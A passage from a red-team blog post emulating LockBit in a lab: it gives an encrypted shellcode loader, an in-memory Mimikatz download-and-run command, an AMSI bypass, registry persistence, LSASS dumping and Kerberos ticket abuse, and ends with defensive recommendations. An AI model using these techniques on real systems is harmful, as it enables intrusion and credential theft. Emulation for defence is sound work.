</pre></table></code></div></div><p>Then to get the output looking nice we do some string manipulation and write it to the resource.ico file:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
imm_by = bytes(ciphertext)

with open('resource.ico', 'wb') as file:
  file.write(imm_by)
</pre></table></code></div></div><p>Then at run time, we decrypt it using the native Windows Crypto API functions:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&amp;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &amp;hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&amp;hKey)){
                return -1;
        }

        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &amp;payload_len)){
                return -1;
        }

        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);

        return 0;
}
</pre></table></code></div></div><p>We have all the pieces ready for encrypting and decrypting but how do we tell our app to compile with this as a resource? We will need two additional files for this. <code class="language-plaintext highlighter-rouge">resources.h</code> will hold a simple declaration <code class="language-plaintext highlighter-rouge">#define FAVICON_ICO 100</code> and <code class="language-plaintext highlighter-rouge">resources.rc</code> will hold the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>#include "resources.h"
FAVICON_ICO RCDATA resource.ico
</pre></table></code></div></div><p>Retrieving our encrypted payload from the resources section can be done with the below:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
resHandle = LoadResource(NULL, res);
payload = (char *) LockResource(resHandle);
payload_len = SizeofResource(NULL, res);
</pre></table></code></div></div><p>Something like <a href="https://gist.github.com/SolomonSklash/e267247e0006ebce999ea2c8a347bbb1">this can be used to then compile the code from the CLI.</a> Or you can just use VisualStudios GUI.</p><p>Putting this altogether, to generate our Sliver payload we need to start a listener and output a beacon to a shellcode format. Feed this through the script and output it encrypted to another ico resource file, which we’ll then include in the resources section of our implant. The process of doing this turned out to be much more complicated than I anticipated. Over the course of building this, I removed the IV declaration because I thought the AES library documentation said that if you don’t supply one, it will auto generate one for you. All fine and good in my mind. That was until I went to decrypt at run time and for some reason the first block of bytes would be decrypted incorrectly. The issue turned out to be that I was mistaken and by not supplying an IV at encryption time, when it came to decrypt, the CBC cipher couldn’t do the first block. But this also highlights the issue with CBC. Other ciphers will derive the IV for subsequent blocks from the first blocks decryption, but with CBC only the first block gets XOR’d with the IV and that’s it. Once past this, the shellcode decoded properly in memory but I still wasn’t seeing a connection back. The final issue here turned out to be that the Shikata Ga Nai encoder needed to be disabled at implant generation time with the flag <code class="language-plaintext highlighter-rouge">--disable-sgn</code> in Sliver.</p><h2 id="initial-access"><span class="mr-2">Initial access</span><a href="#initial-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>LockBit is able to establish initial access through phishing, exploiting public web apps, or through exposed remote desktop protocol. For the sake of our exercise, we will assume that our target has been phished with a OneNote attachment and the beacon was fetched and executed successfully.</p><p><a href="/assets/img/AEE/defender-bypassed.png" class="popup img-link "><img data-src="/assets/img/AEE/defender-bypassed.png" alt="Payload" class="lazyload" data-proofer-ignore></a></p><h3 id="establishing-persistence"><span class="mr-2">Establishing persistence</span><a href="#establishing-persistence" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Post exploitation, maintaining persistence is one of the more important steps to take. A common way to do this is to add a registry key to the machine that will run our beacon on startup.</p><p><a href="/assets/img/AEE/hkcu-runtime.png" class="popup img-link "><img data-src="/assets/img/AEE/hkcu-runtime.png" alt="HKCU Key" class="lazyload" data-proofer-ignore></a></p><p><a href="https://www.fortinet.com/blog/threat-research/emerging-lockbit-campaign"> Another way to maintain persistence employed by LockBit</a> is to add a key to <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon</code> with the value <code class="language-plaintext highlighter-rouge">/v Shell /d "explorer.exe, beacon.batch" /f</code> and load a few configuration options into the batch script for downloading and running it. Testing both of these methods is relevant for determining alert coverage level.</p><h3 id="dumping-credentials"><span class="mr-2">Dumping credentials</span><a href="#dumping-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We now have a persistent implant running on the host. Our next step is to get some credentials. We can obfuscate Mimikatz for this an drop it to disk, or we can choose to run it in memory and avoid dropping it to disk entirely. The latter can be done with the following PowerShell:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
</pre></table></code></div></div><p>However, running this from the command prompt gets it flagged immediately by the AMSI service on Windows and generates an alert. We need a way to disable or bypass AMSI so that we can continue uninterrupted. A simple search though in GitHub brings us to <a href="https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4">a page of updated AMSI bypasses</a>. From there, this one-liner was able to disable AMSI:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
</pre></table></code></div></div><p>Let’s break this down. First I declare <code class="language-plaintext highlighter-rouge">si</code> and <code class="language-plaintext highlighter-rouge">Am</code> as two variables. I then get the <code class="language-plaintext highlighter-rouge">type</code> of AmsiUtils which looks like the below.</p><p><a href="/assets/img/AEE/amsiUtils.png" class="popup img-link "><img data-src="/assets/img/AEE/amsiUtils.png" alt="AMSI" class="lazyload" data-proofer-ignore></a></p><p>Then I use the type to get the field from <code class="language-plaintext highlighter-rouge">amsiInitFailed</code> called <code class="language-plaintext highlighter-rouge">'NonPublic,Static'</code> and set it to <code class="language-plaintext highlighter-rouge">True</code>. Compare the below images to see what the field looks like before and after the completed AMSI bypass.</p><p><a href="/assets/img/AEE/amsi-disabled.png" class="popup img-link "><img data-src="/assets/img/AEE/amsi-disabled.png" alt="Disabled" class="lazyload" data-proofer-ignore></a></p><p>This technique is an evolution to the one from Matt Graeber discovered in 2016, with the only change really being additional obfuscation. It allowed for us to download and execute Mimikatz in memory which is what we needed for progressing to the next step.</p><h3 id="what-about-backstab"><span class="mr-2">What about Backstab?</span><a href="#what-about-backstab" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Backstab simply wasn’t needed for this. Had there been a different EDR running to try and protect us, it would have come more into play then, but as it stood an AMSI bypass was all it took to let us run through the Defender protected domain unimpeded. For testing’s sake, Backstab was dropped to disk in order to evaluate the detection and used to kill a number of processes, all of which Defender let happen without a care in the world.</p><h3 id="exfiltrating-from-the-fileshare"><span class="mr-2">Exfiltrating from the fileshare</span><a href="#exfiltrating-from-the-fileshare" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Often times in these exercises people think of domain admin as the end-all be-all goal. Unlocking this should unlock the keys to the kingdom. And blue teams know this, which is why there is an absurd amount of alerting around the role. So always gunning for getting DA may actually get your cover blown faster than determining what is valuable to the company and taking that. In our case, since we are a financial services company, this will be financial information such as customer records improperly stored in a fileshare. And exfiltrating these is actually on track for ransomware gangs, they have pivoted to not just encrypting files but also stealing them to ensure a ransom is paid.</p><p>In our example, there are a couple file shares. One has general scripts and one with financial information. The financial information share is privileged to only a few teams but the script share is wide open to most members in order to facilitate faster sharing. As it so happens, a Windows admin on the IT team also stores their automation scripts here and the file server needs one of them to stop and start a service on a schedule. We can change that script that it is reading from to do its normal actions, but at the end download and execute our beacon from the C2. Then all we have to do is wait for this service to run and we should see a new session generated in Sliver.</p><p>Now that we have the new machine compromised, we want to do the same thing we did on the first server and bypass AMSI before dumping users with Mimikatz. Then we run through the same process of elevating to this new user and access the share with their permissions before finally exfiltrating the sensitive documents.</p><p>What if we wanted to do something more interesting though? What we did here did get us results, but it made a lot of noise and it was a little hacky. Let’s rewind back to when we first dropped the beacon.</p><h2 id="evolving-the-attack"><span class="mr-2">Evolving the attack</span><a href="#evolving-the-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After dropping the beacon and getting execution and then persistence, the next step was to dump credentials through Mimikatz and an AMSI patch. That’s all fine and dandy, but Sliver offers built in tools to do a lot of this. This was mentioned briefly in January in the rundown of Sliver v Havoc, but let’s take the opportunity and really flex Armory here.</p><p>First, I want to determine the users password. There’s a lot of options for doing this, but let’s just ask them. Armory has an option for this called <code class="language-plaintext highlighter-rouge">c2tc-askcreds</code> which will pop a box and ask them to enter their username and password.</p><p><a href="/assets/img/AEE/ask-nicely.png" class="popup img-link "><img data-src="/assets/img/AEE/ask-nicely.png" alt="Say please" class="lazyload" data-proofer-ignore></a></p><p>When they enter their credentials here, you should see this reflected back in the Sliver console.</p><p>After getting credentials, what’s next? The prior method for lateral movement was suboptimal. It relied on taking advantage of a poorly configured service. We don’t need to do that though. Another method is to use SharpMapExec which we can use in conjunction with the newly acquired credentials to see if there are any high level saved accounts in LSASS process memory.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sharpmapexec ntlm winrm /user:USER /password:PASSWORD /computername:COMPNAME /domain:culbertreport.com /m:comsvcs
</pre></table></code></div></div><p>Locate a user who looks privileged and grab their password value!</p><p>But wait! There’s more! An even easier method to dump LSASS is to use the built in DLL comsvcs.dll and then exfiltrate that dumped file. This will just require further examination in Mimikatz or a similar tool. You can use Sliver to determine the LSASS Process ID (PID).</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full
</pre></table></code></div></div><p>A final alternative approach is to go hands on keyboard, open an RDP session, and run Process Hacker as an Admin and make a dump of LSASS that way, again examining it with Mimikatz.</p><p>Regardless of what method you choose, I now have their encrypted credentials, so what can I do with them? Through Armory, I can additionally use Rubeus to generate a Kerberos ticket granting ticket and apply it to our current session.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rubeus asktgt /user:USERNAME /rc4:PASSWORD /ptt
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">/ptt</code> is what will apply this to our current shell.</p><p>Now that we have this, just enter a new PowerShell session on the fileshare and bob’s your uncle.</p><h2 id="results"><span class="mr-2">Results</span><a href="#results" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This lab is definitely bordering on a worst case scenario. There is no enterprise EDR and no SIEM and the only defense is Defender. Regardless, our imaginary IT/Sec team should come away from this emulation with a lot of knowledge now about insecure permissions, overly permissive service boundaries, and improperly secured LSASS. Our dropper was able to run uninhibited after decrypting in memory and utilizing a number of suspicious Windows API calls, Mimikatz was entered into the command prompt and this didn’t set off an alarm, and Backstab could kill processes with impunity. After the adversary TTPs were run through, additional TTPs were introduced in the form of SharpMapExec and Rubeus and neither of those were stopped or alerted on either.</p><p>Taking what was learned here, I should be able to present this to my leadership team in order to justify new expenses like a SIEM for logging and alerting and a better EDR solution. But what kind of alerts should be generated? Relying on static signatures of the binary and payload code is easy to bypass, but behavioral alerting is a lot trickier to get around. For instance, our registry modification should always create an alert especially when an item is added to run at startup. Then following that, PowerShell commands like InvokeExpression(IEX) and Net.WebClient are common commands used in attack scenarios and should also generate an alert on use. Additionally, using comsvcs or any other method to access LSASS should generate an alert. Speaking of, LSASS protection is a major priority for many companies. Had this been enabled, SharpMapExec and Mimikatz would not have been able to pull passwords out of that memory space. <a href="https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/">Microsoft has extensive documentation on how LSASS is abused by threat actors</a> and what you can do to protect it. These policies should be rolled out domain wide.</p><p>Data loss protection (DLP) is something that may come to mind as a possible solution to this scenario. There are a lot of products that offer DLP and very few EDR vendors roll it into their offering, so it would most likely be an additional expense you have to consider. You also have to consider the target threat that DLP addresses. Rarely will it prevent custom protocols from being used to read and send file contents out of the company, its primary target will often instead be insider threats - people who, for one reason or another, try to email or upload sensitive information to outside the bounds of the company.</p><p>This lab really just scratched the surface of potential methods for privilege elevation, lateral movement, and data exfiltration. There is a lot more that can be done both from the defenders and attackers, such as abusing certificate services as outlined in <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">Certified Pre-Owned</a>. I hope to revisit this soon to explore more of those attack paths as well as containers and cloud security.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/redteam/'>redteam</a>, <a href='/categories/technical/'>TECHNICAL</a>, <a href='/categories/offensive-security/'>offensive-security</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Adversary%20Emulation%20Exercises%20-%20Culbert%20Report&url=%2Fposts%2FAdversary-Emulation-Exercise%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Adversary%20Emulation%20Exercises%20-%20Culbert%20Report&u=%2Fposts%2FAdversary-Emulation-Exercise%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2FAdversary-Emulation-Exercise%2F&text=Adversary%20Emulation%20Exercises%20-%20Culbert%20Report" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Making-Red-Teaming-Safer/">Making Red Teaming Safer</a><li><a href="/posts/Human-Learning-Is-Irreplaceable/">Human Learning Is Irreplaceable</a><li><a href="/posts/Building-A-Detection-Lab-Around-Suricata/">Building A Detection Lab Around Suricata</a><li><a href="/posts/The-evolution-of-evasion/">The Evolution Of Evasion</a><li><a href="/posts/C2-Smackdown-Empire-vs-Mythic/">C2 Smackdown Empire Vs Mythic</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/c2/">c2</a> <a class="post-tag" href="/tags/container/">container</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/graphana/">graphana</a> <a class="post-tag" href="/tags/jira/">jira</a> <a class="post-tag" href="/tags/nessus/">nessus</a> <a class="post-tag" href="/tags/non-technical/">non-technical</a> <a class="post-tag" href="/tags/nuages/">nuages</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Sliver-vs-Havoc/"><div class="card-body"> <em class="small" data-ts="1673568000" data-df="ll" > Jan 13, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Sliver vs Havoc</h3><div class="text-muted small"><p> Sliver vs Havoc - Two Adversary Emulation Frameworks I wanted to objectively measure two well known frameworks against one another and see which fits certain needs best. To this end, each platfor...</p></div></div></a></div><div class="card"> <a href="/posts/Ever-wondered-how-AV-knows/"><div class="card-body"> <em class="small" data-ts="1663891200" data-df="ll" > Sep 23, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>How AV Hooks NTDLL</h3><div class="text-muted small"><p> How Does AV Know? Have you ever wondered how AV knows what that the application you’re trying to run is malicious when it doesn’t have a known signature? NTDLL is the answer. Before we begin It’...</p></div></div></a></div><div class="card"> <a href="/posts/Bloodhound/"><div class="card-body"> <em class="small" data-ts="1678233600" data-df="ll" > Mar 8, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bloodhound basics</h3><div class="text-muted small"><p> Bloodhound What is it? Bloodhound describes their product as using graph theory to reveal hidden and unintended links between users and groups that makes lateral movement easier for attackers. Natu...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Bloodhound/" class="btn btn-outline-primary" prompt="Older"><p>Bloodhound basics</p></a> <a href="/posts/C2-Smackdown-Empire-vs-Mythic/" class="btn btn-outline-primary" prompt="Newer"><p>C2 Smackdown Empire Vs Mythic</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/c2/">c2</a> <a class="post-tag" href="/tags/container/">container</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/graphana/">graphana</a> <a class="post-tag" href="/tags/jira/">jira</a> <a class="post-tag" href="/tags/nessus/">nessus</a> <a class="post-tag" href="/tags/non-technical/">non-technical</a> <a class="post-tag" href="/tags/nuages/">nuages</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2026 <a href="https://twitter.com/">Matt Culbert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
